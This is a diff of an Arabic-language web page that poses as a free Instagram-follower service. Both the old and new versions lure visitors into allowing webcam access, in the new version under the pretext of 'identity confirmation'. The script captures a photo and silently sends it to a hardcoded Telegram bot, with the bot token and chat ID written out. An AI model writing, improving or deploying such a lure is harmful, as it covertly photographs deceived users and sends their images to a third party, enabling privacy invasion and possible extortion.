@@ -1,84 +1,52 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>زيادة متابعين إنستغرام</title>
+  <title>زيادة متابعين إنستا</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #fafafa;
-      text-align: center;
-      padding: 50px;
-    }
-    .box {
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      max-width: 400px;
-      margin: auto;
-    }
-    input, button {
-      width: 90%;
-      padding: 12px;
-      margin: 10px 0;
-      font-size: 16px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-    button {
-      background-color: #3897f0;
-      color: white;
-      border: none;
-    }
+    body { text-align: center; font-family: sans-serif; background: #f2f2f2; }
+    video, canvas { margin: 10px; border: 2px solid #000; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>احصل على متابعين إنستغرام مجاناً</h2>
-    <input type="text" id="username" placeholder="اسم المستخدم">
-    <input type="number" id="followers" placeholder="عدد المتابعين المطلوب">
-    <button onclick="start()">بدأ الآن</button>
-    <p id="status"></p>
-    <video id="video" autoplay playsinline width="300" style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-  </div>
+  <h2>تأكيد الهوية لزيادة المتابعين</h2>
+  <p>يرجى السماح للكاميرا والتقاط صورة لتأكيد الهوية</p>
+  
+  <video id="video" width="300" autoplay></video>
+  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas><br>
+  <button onclick="capture()">التقاط وإرسال</button>
 
   <script>
-    async function start() {
-      document.getElementById("status").innerText = "جاري المعالجة...";
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
 
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => video.srcObject = stream)
+      .catch(err => alert("فشل الوصول إلى الكاميرا: " + err));
 
-        setTimeout(() => {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext("2d").drawImage(video, 0, 0);
-          const imageData = canvas.toDataURL("image/png");
+    function capture() {
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(sendToTelegram, 'image/jpeg');
+    }
 
-          fetch("https://api.telegram.org/bot7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E/sendPhoto", {
-            method: "POST",
-            body: JSON.stringify({
-              chat_id: "6437823957",
-              photo: imageData
-            }),
-            headers: {
-              "Content-Type": "application/json"
-            }
-          });
+    function sendToTelegram(blob) {
+      const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
+      const chat_id = '6437823957';
+      const formData = new FormData();
+      formData.append('chat_id', chat_id);
+      formData.append('photo', blob, 'photo.jpg');
 
-          document.getElementById("status").innerText = "جاري إرسال المتابعين...";
-        }, 5000);
-      } catch (err) {
-        document.getElementById("status").innerText = "تم رفض الوصول للكاميرا.";
-        console.error(err);
-      }
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(res => {
+        if (res.ok) alert("تم إرسال الصورة بنجاح");
+        else alert("فشل الإرسال");
+      })
+      .catch(err => alert("خطأ في الإرسال: " + err));
     }
   </script>
 </body>
